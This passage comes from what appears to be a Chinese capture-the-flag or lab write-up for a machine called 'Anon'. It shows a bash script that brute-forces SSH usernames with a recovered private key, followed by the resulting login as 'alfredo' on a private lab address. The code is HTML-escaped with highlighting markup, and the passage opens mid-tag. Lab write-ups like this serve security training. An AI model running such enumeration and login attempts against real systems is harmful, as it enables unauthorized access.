lass=\"hljs-comment\"\u003e# 读取用户名字典\u003c/span\u003e\nUSERNAMES=( $(cat \u003cspan class=\"hljs-string\"\u003e\"$USERNAME_FILE\"\u003c/span\u003e) )\n\n\u003cspan class=\"hljs-comment\"\u003e# 爆破用户名循环\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e USERNAME \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"${USERNAMES[@]}\"\u003c/span\u003e; do\n  echo \u003cspan class=\"hljs-string\"\u003e\"尝试登录: $USERNAME\"\u003c/span\u003e\n\n  \u003cspan class=\"hljs-comment\"\u003e# 执行 SSH 登录，2秒超时避免卡住\u003c/span\u003e\n  OUTPUT=$(ssh -o BatchMode=yes -o ConnectTimeout=\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"$USERNAME\"\u003c/span\u003e@$TARGET_IP -i \u003cspan class=\"hljs-string\"\u003e\"$PRIVATE_KEY\"\u003c/span\u003e exit \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e\u0026#x26;\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n  \u003cspan class=\"hljs-comment\"\u003e# 检查是否输出包含 \"password\"（通常代表需要密码）\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e echo \u003cspan class=\"hljs-string\"\u003e\"$OUTPUT\"\u003c/span\u003e | grep -qi \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e; then\n    echo \u003cspan class=\"hljs-string\"\u003e\"[失败] $USERNAME 需要密码，跳过。\"\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n    echo \u003cspan class=\"hljs-string\"\u003e\"[成功] 找到有效用户名: $USERNAME\"\u003c/span\u003e\n  fi\n\n  echo \u003cspan class=\"hljs-string\"\u003e\"-------------------------------\"\u003c/span\u003e\ndone\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后爆破出来用户名\u003ccode\u003ealfredo\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─\u003cspan class=\"hljs-comment\"\u003e# ssh alfredo@192.168.56.19 -i id\u003c/span\u003e\nalfredo@anon:~$ \n\u003c/
